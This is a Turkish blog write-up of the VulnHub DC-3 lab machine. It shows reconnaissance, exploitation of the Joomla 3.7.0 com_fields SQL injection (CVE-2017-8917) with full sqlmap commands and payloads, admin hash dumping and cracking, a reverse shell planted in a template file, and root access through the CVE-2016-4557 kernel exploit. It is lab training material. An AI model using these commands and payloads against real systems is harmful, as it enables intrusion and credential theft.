---
title: "VULNHUB DC-3 Write Up"
date: 2020-09-29T13:06:24+03:00
draft: false
toc: true
images:
tags: [Vulnhub,write-up,joomla,sqlinjection,sqlmap,CVE-2017-8917,CVE-2016-4557] 
categories: [write-up]
author : "Barcode"
Description : "Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-32,312/) 'da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar..."
cover : images/vulnhub/dc3/cover.png
  
---

Merhaba, Bu yazımda sizlere [VULNHUB](https://www.vulnhub.com/entry/dc-32,312/) 'da yer alan DC-3 adlı makinanın çözümünden bahsedeceğim. Keyifli okumalar... :blush:

## 1. Keşif Aşaması

Makina kalıp dosyası siteden indirildikten sonra sanallaştırma yazılımları tarafından import edilir ve çalıştırılır. DHCP servisi tarafından atanan ip adresinin tespit edilmesi için netdiscover aracı ile ağda tarama yapılır.

```bash
netdiscover -i eth1
```

{{< image src="/images/vulnhub/dc3/netdiscover.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Nmap ile tüm portlar ve açık olan portlarda çalışan servisler tespit edilir.

```bash
sudo nmap -sV -sC -p- 192.168.56.111
```

{{< image src="/images/vulnhub/dc3/nmap.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}


80 portunda çalışan web servisine tarayıcından istek atılır. Sayfa kaynak kodu incelendiğinde Joomla CMS uygulamasının çalıştığı görülmektedir.

{{< image src="/images/vulnhub/dc3/web.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Web dizin taraması gerçekleştirilir. Ayrıca google'da arama yapıldığında ***administrator/manifests/files/joomla.xml*** içerisnde uygulama sürümü hakkında bilgi yer aldığı tespit edilir.

```bash
gobuster dir -u http://192.168.56.111 -w /usr/share/wordlists/dirb/big.txt
```

```terminal
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.56.111
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/09/28 13:46:56 Starting gobuster
===============================================================
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/administrator (Status: 301)
/bin (Status: 301)
/cache (Status: 301)
/cli (Status: 301)
/components (Status: 301)
/images (Status: 301)
/includes (Status: 301)
/language (Status: 301)
/layouts (Status: 301)
/libraries (Status: 301)
/media (Status: 301)
/modules (Status: 301)
/plugins (Status: 301)
/server-status (Status: 403)
/templates (Status: 301)
/tmp (Status: 301)
===============================================================
2020/09/28 13:47:00 Finished
===============================================================
```
Web dizin taramasında joomla uygulamasının standart dosyaları dışında bir dosya tespit edilememektedir.

http://192.168.56.111/administrator/manifests/files/joomla.xml adresine istek atılırak sürüm bilgisi tespit edilir. Sürümün 3.7.0 olduğu görülmektedir.


```xml
?xml version="1.0" encoding="UTF-8"?>
<extension version="3.6" type="file" method="upgrade">
	<name>files_joomla</name>
	<author>Joomla! Project</author>
	<authorEmail>admin@joomla.org</authorEmail>
	<authorUrl>www.joomla.org</authorUrl>
	<copyright>(C) 2005 - 2017 Open Source Matters. All rights reserved</copyright>
	<license>GNU General Public License version 2 or later; see LICENSE.txt</license>
	<version>3.7.0</version>
	<creationDate>April 2017</creationDate>
	<description>FILES_JOOMLA_XML_DESCRIPTION</description>

	<scriptfile>administrator/components/com_admin/script.php</scriptfile>

....
```

Joomla sürümünün güncel olmadığı görülmektedir. Searchsploit ile exploit araması yapılır.

```bash
searchsploit joomla 3.7
```
```bash

---------------------------------------------- ---------------------------------
 Exploit Title                                |  Path
---------------------------------------------- ---------------------------------
Joomla! 3.7 - SQL Injection                   | php/remote/44227.php
Joomla! 3.7.0 - 'com_fields' SQL Injection    | php/webapps/42033.txt
Joomla! Component ARI Quiz 3.7.4 - SQL Inject | php/webapps/46769.txt
Joomla! Component com_realestatemanager 3.7 - | php/webapps/38445.txt
Joomla! Component Easydiscuss < 4.0.21 - Cros | php/webapps/43488.txt
Joomla! Component J2Store < 3.3.7 - SQL Injec | php/webapps/46467.txt
Joomla! Component JomEstate PRO 3.7 - 'id' SQ | php/webapps/44117.txt
Joomla! Component Jtag Members Directory 5.3. | php/webapps/43913.txt
Joomla! Component Quiz Deluxe 3.7.4 - SQL Inj | php/webapps/42589.txt
---------------------------------------------- ---------------------------------
```
İkinci sırada yer alan exploit -m parametresi ile indirilip incelenir. Uygulamada SqlInjection zafiyeti oluğu görülmektedir. Sqlmap aracı kullanılarak zafiyet sömürülür.

```txt
Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap: 

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)
```
İlk olarak veritabanları tespit edilir.

```bash
sqlmap -u "http://192.168.56.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```
{{< image src="/images/vulnhub/dc3/sqlmap.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

Tespit edilen joomla veritabanı seçilerek, veritabanında yer alan tablolar tespit edilir.

```bash
sqlmap -u "http://192.168.56.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb --tables -p list[fullordering]
```

```txt
Database: joomladb
[76 tables]
+---------------------+
| #__assets           |
| #__associations     |
| #__banner_clients   |
| #__banner_tracks    |
| #__banners          |
| #__bsms_admin       |
| #__bsms_books       |
| #__bsms_comments    |
| #__bsms_locations   |
| #__bsms_mediafiles  |
| #__bsms_message_typ |
| #__bsms_podcast     |
| #__bsms_series      |
| #__bsms_servers     |
| #__bsms_studies     |
| #__bsms_studytopics |
| #__bsms_teachers    |
| #__bsms_templatecod |
| #__bsms_templates   |
| #__bsms_timeset     |
| #__bsms_topics      |
| #__bsms_update      |
| #__categories       |
| #__contact_details  |
| #__content_frontpag |
| #__content_rating   |
| #__content_types    |
| #__content          |
| #__contentitem_tag_ |
| #__core_log_searche |
| #__extensions       |
| #__fields_categorie |
| #__fields_groups    |
| #__fields_values    |
| #__fields           |
| #__finder_filters   |
| #__finder_links_ter |
| #__finder_links     |
| #__finder_taxonomy_ |
| #__finder_taxonomy  |
| #__finder_terms_com |
| #__finder_terms     |
| #__finder_tokens_ag |
| #__finder_tokens    |
| #__finder_types     |
| #__jbsbackup_timese |
| #__jbspodcast_times |
| #__languages        |
| #__menu_types       |
| #__menu             |
| #__messages_cfg     |
| #__messages         |
| #__modules_menu     |
| #__modules          |
| #__newsfeeds        |
| #__overrider        |
| #__postinstall_mess |
| #__redirect_links   |
| #__schemas          |
| #__session          |
| #__tags             |
| #__template_styles  |
| #__ucm_base         |
| #__ucm_content      |
| #__ucm_history      |
| #__update_sites_ext |
| #__update_sites     |
| #__updates          |
| #__user_keys        |
| #__user_notes       |
| #__user_profiles    |
| #__user_usergroup_m |
| #__usergroups       |
| #__users            |
| #__utf8_conversion  |
| #__viewlevels       |
+---------------------+
```
Joomla veritabanında yer alan ***#__users*** tablosunda yer alan kolonlar tespit edilir.

```bash
sqlmap -u "http://192.168.56.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' --columns -p list[fullordering]
```

```txt
Database: joomladb
Table: #__users
[6 columns]
+----------+-------------+
| Column   | Type        |
+----------+-------------+
| id       | numeric     |
| name     | non-numeric |
| password | non-numeric |
| email    | non-numeric |
| params   | non-numeric |
| username | non-numeric |
+----------+-------------+
```

Tablodaki username,password ve email sutunlarında yer alan bilgiler dump edilir.

```bash
sqlmap -u "http://192.168.56.111/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent -D joomladb -T '#__users' -C username,password,email --dump -p list[fullordering]
```

```text
Database: joomladb
Table: #__users
[1 entry]
+----------+--------------------------------------------------------------+--------------------------+
| username | password                                                     | email                    |
+----------+--------------------------------------------------------------+--------------------------+
| admin    | $2y$10$DpfpYjADpejngxNh9GnmCeyIHCWpL97CVRnGeZsVJwR0kWFlfB1Zu | freddy@norealaddress.net |
+----------+--------------------------------------------------------------+--------------------------+
```
Admin kullanıcısına ait hash bilgisi elde edilmektedir. Elde edilen hash bilgisi hashcat aracı ile sözlük saldırısı yapılarak kırılır. Elde edilen hash türü tespit edilir.

{{< image src="/images/vulnhub/dc3/hashcatt.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}


```bash
hashcat -m 3200 --force hash.txt /usr/share/wordlists/rockyou.txt 
```

{{< image src="/images/vulnhub/dc3/hashcat.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

## 2. Erişim Sağlanması

Admin kullancısı ile sisteme giriş yapılır. Daha sonra template içerisinde yer alan protostar temasındaki error.php dosyası reverse shell alacak şekilde düzenlenir.

{{< image src="/images/vulnhub/dc3/login.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}

*http://192.168.56.111/template/protostar/error.php* adresine istek atılarak ncat ile dinlenen porta bağlantı sağlanılır.

{{< image src="/images/vulnhub/dc3/shell.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}
Python pty modulü kullanılarak etkileşimli kabuğa geçilir.
```python
python -c 'import pty;pty.spawn("/bin/bash")'
```

## 3. Yetki Yükseltme

Yetki yükseltmek için LinEnum betiği kullanılırak sistem hakkında bilgi toplanır. 

```bash
#########################################################
# Local Linux Enumeration & Privilege Escalation Script #
#########################################################
# www.rebootuser.com
# version 0.982

[-] Debug Info
[+] Thorough tests = Disabled


Scan started at:
Tue Sep 29 08:00:57 AEST 2020


### SYSTEM ##############################################
[-] Kernel information:
Linux DC-3 4.4.0-21-generic #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016 i686 i686 i686 GNU/Linux


[-] Kernel information (continued):
Linux version 4.4.0-21-generic (buildd@lgw01-06) (gcc version 5.3.1 20160413 (Ubuntu 5.3.1-14ubuntu2) ) #37-Ubuntu SMP Mon Apr 18 18:34:49 UTC 2016


[-] Specific release information:
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=16.04
DISTRIB_CODENAME=xenial
DISTRIB_DESCRIPTION="Ubuntu 16.04 LTS"
NAME="Ubuntu"
VERSION="16.04 LTS (Xenial Xerus)"
ID=ubuntu
ID_LIKE=debian
PRETTY_NAME="Ubuntu 16.04 LTS"
VERSION_ID="16.04"
HOME_URL="http://www.ubuntu.com/"
SUPPORT_URL="http://help.ubuntu.com/"
BUG_REPORT_URL="http://bugs.launchpad.net/ubuntu/"
UBUNTU_CODENAME=xenial

### USER/GROUP ##########################################
[-] Current user/group info:
uid=33(www-data) gid=33(www-data) groups=33(www-data)


[-] It looks like we have some admin users:
uid=104(syslog) gid=108(syslog) groups=108(syslog),4(adm)
uid=1000(dc3) gid=1000(dc3) groups=1000(dc3),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd),117(lpadmin),118(sambashare)


[-] Contents of /etc/passwd:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
syslog:x:104:108::/home/syslog:/bin/false
_apt:x:105:65534::/nonexistent:/bin/false
lxd:x:106:65534::/var/lib/lxd/:/bin/false
mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
messagebus:x:108:112::/var/run/dbus:/bin/false
uuidd:x:109:113::/run/uuidd:/bin/false
dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
dc3:x:1000:1000:dc3,,,:/home/dc3:/bin/bash

### ENVIRONMENTAL #######################################
[-] Environment information:
APACHE_PID_FILE=/var/run/apache2/apache2.pid
APACHE_RUN_USER=www-data
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
APACHE_LOG_DIR=/var/log/apache2
PWD=/tmp
LANG=C
APACHE_RUN_GROUP=www-data
SHLVL=2
APACHE_RUN_DIR=/var/run/apache2
APACHE_LOCK_DIR=/var/lock/apache2
_=/usr/bin/env

[-] Can we read/write sensitive files:
-rw-r--r-- 1 root root 1614 Apr 25 16:27 /etc/passwd
-rw-r--r-- 1 root root 806 Apr 25 16:26 /etc/group
-rw-r--r-- 1 root root 575 Oct 23  2015 /etc/profile
-rw-r----- 1 root shadow 968 Apr 25 16:27 /etc/shadow

[-] SUID files:
-rwsr-xr-x 1 root root 43316 May  8  2014 /bin/ping6
-rwsr-xr-x 1 root root 157424 Mar 15  2019 /bin/ntfs-3g
-rwsr-xr-x 1 root root 26492 Apr 14  2016 /bin/umount
-rwsr-xr-x 1 root root 38900 May 17  2017 /bin/su
-rwsr-xr-x 1 root root 30112 Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root root 34812 Apr 14  2016 /bin/mount
-rwsr-xr-x 1 root root 38932 May  8  2014 /bin/ping
-rwsr-sr-x 1 root root 105004 Mar 19  2019 /usr/lib/snapd/snap-confine
-rwsr-xr-x 1 root root 13960 Jan 15  2019 /usr/lib/policykit-1/polkit-agent-helper-1
-rwsr-xr-x 1 root root 38300 Mar  8  2017 /usr/lib/i386-linux-gnu/lxc/lxc-user-nic
-rwsr-xr-x 1 root root 513528 Mar  5  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-- 1 root messagebus 46436 Oct 12  2016 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root root 5480 Mar 28  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root root 53128 May 17  2017 /usr/bin/passwd
-rwsr-xr-x 1 root root 36288 May 17  2017 /usr/bin/newgidmap
-rwsr-xr-x 1 root root 78012 May 17  2017 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 159852 May 29  2017 /usr/bin/sudo
-rwsr-xr-x 1 root root 18216 Jan 15  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root root 39560 May 17  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 48264 May 17  2017 /usr/bin/chfn
-rwsr-xr-x 1 root root 36288 May 17  2017 /usr/bin/newuidmap
-rwsr-xr-x 1 root root 34680 May 17  2017 /usr/bin/newgrp
-rwsr-sr-x 1 daemon daemon 50748 Jan 15  2016 /usr/bin/at

### SCAN COMPLETE ####################################
```

Kernel sürümünün eski olduğu görülmektedir. İlk olarak Dirty-COW adı verilen zafiyet ile yetki yükseltilmeye çalışılmıştır. Ancak www-data kullanıcısı login işlemine kapalı olduğundan /etc/passwd üzerinde yapılan her değişiklikten sonra sistem crash olmuştur.

 *Linux Kernel 4.4.x çekirdeğine sahip Ubuntu 16.x sisteminde “Linux Kernel 4.4.x (Ubuntu 16.04) – ‘double-fdput()’ bpf(BPF_PROG_LOAD) Privilege Escalation” isimli CVE-2016-4557 ID’li kritik bir zafiyet bulunmaktadır.* Searchsploit üzerinde arama yapılır.

```bash
searchsploit Linux Kernel 4.4.x
```

```bash
------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                            |  Path
------------------------------------------------------------------------------------------ ---------------------------------
Linux Kernel 4.4.x (Ubuntu 16.04) - 'double-fdput()' bpf(BPF_PROG_LOAD) Privilege Escalat | linux/local/39772.txt
```
Searchsploit üzerinden exploit bilgisayara indirilir.
```bash
searchsploit -m 39772
```
İndirilen exploit dosyası localhosttan hedef makinaya indirilir. Daha sonra zip ve tar arşiv dosyaları çıkarılır. 
```terminal
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ls -lsa
ls -lsa
total 28
4 drwxr-x--- 2 www-data www-data 4096 Apr 26  2016 .
4 drwxr-xr-x 4 www-data www-data 4096 Sep 29 08:29 ..
4 -rwxr-x--- 1 www-data www-data  155 Apr 26  2016 compile.sh
8 -rw-r----- 1 www-data www-data 4188 Apr 26  2016 doubleput.c
4 -rw-r----- 1 www-data www-data 2186 Apr 26  2016 hello.c
4 -rw-r----- 1 www-data www-data  255 Apr 26  2016 suidhelper.c
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./compile.sh
./compile.sh
doubleput.c: In function 'make_setuid':
doubleput.c:91:13: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .insns = (__aligned_u64) insns,
             ^
doubleput.c:92:15: warning: cast from pointer to integer of different size [-Wpointer-to-int-cast]
    .license = (__aligned_u64)""
               ^
```   
Derleme sonucu oluşturulan binary dosyası çalıştırılarak yetki yükseltme işlemi tamamlanır.

```terminal
www-data@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit$ ./doubleput
./doubleput
starting writev
woohoo, got pointer reuse
writev returned successfully. if this worked, you'll have a root shell in <=60 seconds.
suid file detected, launching rootshell...
we have root privs now...
root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# id
id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
root@DC-3:/tmp/39772/ebpf_mapfd_doubleput_exploit# cd /root
cd /root
root@DC-3:/root# ls
ls
the-flag.txt
```

{{< image src="/images/vulnhub/dc3/flag.png" alt="Hay aksi" position="center" style="border-radius: 10px;" >}}


           


